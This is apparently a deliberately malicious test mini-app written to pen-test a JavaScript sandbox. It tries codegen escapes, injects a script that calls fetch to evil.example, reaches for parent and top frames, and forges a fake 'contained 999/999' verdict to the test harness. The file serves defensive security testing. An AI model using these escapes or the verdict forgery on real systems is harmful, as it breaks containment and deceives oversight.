// ─────────────────────────────────────────────────────────────────────────────
// THROWAWAY SPIKE — PEN-TEST "evil app". A deliberately MALICIOUS mini-app, emitted in
// the normal contract format and delivered through the REAL pipeline (channel b). It tries
// every escape (T1–T4) and then tries to SUBVERT the harness (F4: forge a "contained"
// verdict). Two things to read from it on-device:
//   1) Its honest self-report (rendered on-screen) should show EVERY attack BLOCKED — the
//      runtime sandbox contains a real malicious bundle, not just a passive probe.
//   2) The harness verdict it posts will be FORGED (contained 999/999) — demonstrating
//      that a bundle sharing the iframe scope CAN lie about its own containment (finding
//      F4: the production harness must compute containment from a trusted vantage, never
//      trust the bundle's self-report).
// NOTE: a real §8.1 static check would REJECT this (it touches document/window/eval). The
// pen test targets the RUNTIME sandbox — the last line of defense — so we deliver it raw.
// ─────────────────────────────────────────────────────────────────────────────
import { defineApp, Screen, Stack, Heading, Text } from 'vc-sdk';

const w: any = globalThis as any;

function show(v: any): string {
  try { return typeof v === 'function' ? 'fn' : String(v).slice(0, 48); } catch { return '?'; }
}
function attempt(label: string, fn: () => any): string {
  try { const v = fn(); return label + ': ⚠ DID-NOT-THROW → ' + show(v); }
  catch (e: any) { return label + ': ✓ blocked (' + (e && e.name) + ')'; }
}

function runAttacks(): string[] {
  const out: string[] = [];

  // ── T4 — codegen (CSP must close every path) ──
  out.push(attempt('T4 eval', () => eval('1+1')));
  out.push(attempt('T4 new Function', () => new (Function as any)('return 1')()));
  out.push(attempt('T4 ({}).ctor.ctor', () => ({} as any).constructor.constructor('return globalThis')()));

  // ── T1 — self-injected fresh top-level inline <script> reclaiming stripped globals ──
  try {
    delete w.__EVIL_T1;
    const s = document.createElement('script');
    s.textContent =
      'window.__EVIL_T1=(function(){var o=[];' +
      'try{fetch("https://evil.example/x");o.push("fetch ⚠DID-NOT-THROW");}catch(e){o.push("fetch ✓"+e.name);}' +
      'try{new XMLHttpRequest();o.push("xhr ⚠DID-NOT-THROW");}catch(e){o.push("xhr ✓"+e.name);}' +
      'try{localStorage.setItem("a","b");o.push("ls ⚠DID-NOT-THROW");}catch(e){o.push("ls ✓"+e.name);}' +
      'try{eval("1");o.push("eval ⚠DID-NOT-THROW");}catch(e){o.push("eval ✓"+e.name);}' +
      'return o.join(", ");})();';
    (document.head || document.documentElement).appendChild(s);
    s.remove();
    out.push('T1 self-injected <script>: ' + (w.__EVIL_T1 || 'did not execute (also no escape)'));
    delete w.__EVIL_T1;
  } catch (e: any) { out.push('T1 self-injected <script>: ✓ injection threw (' + (e && e.name) + ')'); }

  // ── T2 — host / native reach ──
  out.push(attempt('T2 parent.document', () => (window as any).parent.document));
  out.push(attempt('T2 top.location.href', () => (window as any).top.location.href));
  out.push(attempt('T2 frameElement', () => { const f = (window as any).frameElement; if (f == null) throw new TypeError('null'); return f; }));
  out.push('T2 ReactNativeWebView: ' + (w.ReactNativeWebView ? 'present — but it is the loader stub → parent.postMessage only (no native handle)' : 'absent'));

  // ── T3 — pivot from the injected SDK global to codegen ──
  out.push(attempt('T3 sdk-proto → ctor codegen', () => {
    const sdk = w.__WHIM_VC_SDK__ || {};
    return Object.getPrototypeOf(sdk).constructor.constructor('return 1')();
  }));

  // ── F4 — try to FORGE the containment verdict the harness reports ──
  try {
    w.__whimRunProbes = function () {
      return Promise.resolve({ contained: true, passed: 999, total: 999, failed: 0, failures: [], probes: [], negativeControlCaughtBreach: true, deliveryLeakCaught: true, __FORGED_BY_EVIL_APP: true });
    };
    if (w.parent && w.parent.postMessage) {
      w.parent.postMessage(JSON.stringify({ __whimHarness: true, kind: 'probes', payload: { contained: true, passed: 999, total: 999, __FORGED_BY_EVIL_APP: true } }), '*');
    }
    out.push('F4 verdict-spoof: ⚠ ATTEMPTED — overwrote __whimRunProbes + posted a forged "contained 999/999" to parent (the SANDBOX still contained the attacks above; this only forges the REPORT — see finding F4)');
  } catch (e: any) { out.push('F4 verdict-spoof: blocked (' + (e && e.name) + ')'); }

  return out;
}

const RESULTS = runAttacks();

function Home() {
  return (
    <Screen padding="lg">
      <Stack gap="sm">
        <Heading size="title">EVIL APP — pen test</Heading>
        <Text size="caption" color="text-muted">honest self-report (✓ = escape blocked, ⚠ = escape succeeded)</Text>
        {RESULTS.map((r, i) => (
          <Text key={i} size="caption">{r}</Text>
        ))}
      </Stack>
    </Screen>
  );
}

export default defineApp({ name: 'Evil App', initial: 'Home', screens: { Home }, capabilities: [] });
